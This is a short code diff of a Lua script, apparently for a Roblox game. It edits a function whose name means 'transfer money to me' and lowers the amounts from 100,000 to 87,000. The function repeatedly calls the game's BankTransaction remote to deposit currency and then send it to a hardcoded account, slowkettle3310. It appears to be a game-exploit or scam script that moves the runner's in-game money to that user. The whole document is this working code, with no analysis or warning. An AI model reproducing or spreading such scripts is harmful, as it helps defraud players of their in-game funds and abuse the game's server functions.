@@ -6,7 +6,7 @@ function perevoddenegmne() --
             local args = {
                 [1] = {
                     ["Type"] = "Deposit",
-                    ["Amount"] = 100000
+                    ["Amount"] = 87000
                 }
             }
             
@@ -15,7 +15,7 @@ function perevoddenegmne() --
             local args = {
                 [1] = {
                     ["Type"] = "Send",
-                    ["Amount"] = 100000,
+                    ["Amount"] = 87000,
                     ["User"] = slowkettle3310
                 }
             }
@@ -26,7 +26,7 @@ function perevoddenegmne() --
             local args = {
             [1] = {
                     ["Type"] = "Deposit",
-                    ["Amount"] = 100000
+                    ["Amount"] = 87000
                 }
             }
             game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
@@ -34,7 +34,7 @@ function perevoddenegmne() --
             local args = {
                 [1] = {
                     ["Type"] = "Send",
-                    ["Amount"] = 100000,
+                    ["Amount"] = 87000,
                     ["User"] = slowkettle3310
                 }
             }
